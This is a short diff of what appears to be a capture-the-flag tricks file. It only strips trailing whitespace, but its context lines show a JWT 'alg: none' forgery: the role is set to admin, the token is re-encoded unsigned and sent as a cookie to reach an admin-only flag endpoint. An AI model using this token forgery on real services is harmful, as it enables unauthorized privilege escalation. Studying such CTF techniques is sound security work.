@@ -39,7 +39,7 @@ tricks:
     payload: |
       # Modify payload:
       payload['role'] = 'admin'
-      
+
       # Re-encode with algorithm='none' (no signature):
       header = {"alg": "none", "typ": "JWT"}
       header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
@@ -52,12 +52,11 @@ tricks:
     payload: |
       # Set cookie with tampered token
       cookies = {'token': tampered_token}
-      
+
       # Verify privilege escalation:
       GET /profile
       # Should show "ADMIN" instead of "USER"
-      
+
       # Access admin-only endpoint:
       GET /gettheflag
       # Returns flag
-
